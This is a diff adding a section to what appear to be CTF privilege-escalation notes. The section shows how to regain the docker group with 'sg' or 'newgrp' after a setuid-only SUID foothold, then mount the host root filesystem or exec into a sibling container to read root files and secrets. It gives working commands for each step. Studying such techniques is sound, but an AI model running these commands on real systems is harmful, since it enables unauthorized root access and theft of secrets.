@@ -280,3 +280,34 @@ Notes:
 - Also works with just `CAP_SYS_ADMIN` + a readable host device even without every other cap.
 
 <!-- promoted-slug: priv-container-host-disk-mount -->
+
+## Acquiring the docker group after a partial-setuid SUID (sg / newgrp)
+
+Docker-group privesc assumes your shell already carries the `docker` supplementary group. A common
+CTF twist breaks that assumption: a **custom SUID binary that only `setuid()`s** to a docker-group
+service account and then `execl("/bin/bash")` gives you that account's **UID but keeps your original
+group set** (setuid does not re-init supplementary groups), so `docker` still hits
+`permission denied ... /var/run/docker.sock`:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | grep -v /snap    # a custom SUID owned by e.g. dockermgr
+/usr/local/bin/diag_shell                                 # -> uid=<svc>, but groups unchanged
+id                                                        # uid=1501(dockermgr) groups=1500(oldgrp)  <- no docker
+```
+
+Pick up the missing group without a password: confirm the UID is a member in `/etc/group`, then use
+`sg` (run one command with the group) or `newgrp` (spawn a shell with it as primary gid) - both are
+SUID-root and only need existing membership:
+
+```bash
+grep -E '^docker:' /etc/group          # docker:x:998:ubuntu,dockermgr   <- our UID is a member
+sg docker -c 'id; docker ps'           # gid=998(docker) now present -> socket works
+# then the usual docker-group -> root file access:
+sg docker -c 'docker run -v /:/mnt --rm alpine chroot /mnt sh -c "id; cat /root/..."'
+sg docker -c 'docker exec <running-container> sh -c "cat /app/secret.py"'   # read a sibling container
+```
+
+The same `sg <grp>`/`newgrp <grp>` trick applies to any group your effective UID belongs to but your
+current process' group set omits (`lxd`, `disk`, `adm`) after a setuid-only foothold. See [[linux-privesc]].
+
+<!-- promoted-slug: docker-group-newgrp-acquire -->
